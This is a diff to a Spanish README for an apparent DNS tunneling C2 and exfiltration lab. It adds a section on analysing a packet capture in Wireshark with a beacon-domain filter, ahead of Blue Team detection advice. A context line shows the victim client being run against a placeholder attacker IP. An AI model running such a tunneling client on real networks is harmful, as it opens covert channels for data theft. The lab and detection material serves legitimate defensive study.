@@ -49,6 +49,18 @@ El cliente requiere que se le especifique la IP del servidor C2 (parámetro -t).
 ```bash
 python dns_victim_client.py -t <IP_DEL_ATACANTE> -p 53
 ```
+---
+
+## 🔍 Análisis Forense de Red (PCAP)
+El repositorio incluye un archivo de captura de red (`dns_tunneling_capture.pcapng`) real generado durante la ejecución de este laboratorio. Esto permite a analistas de SOC e ingenieros de Blue Team estudiar el comportamiento del protocolo sin necesidad de desplegar el entorno.
+
+### Cómo analizar la captura en Wireshark:
+1. Abre el archivo `dns_tunneling_capture.pcapng` en Wireshark.
+2. Aplica el siguiente filtro de visualización para aislar el tráfico del canal encubierto:
+   ```text
+   dns.qry.name == "beacon.falso.local"
+   ```
+   
 🛡️ Blue Team: Detección y Mitigación
 Para detectar y bloquear este tipo de exfiltración/C2 en una red corporativa, se recomienda aplicar las siguientes contramedidas:
 
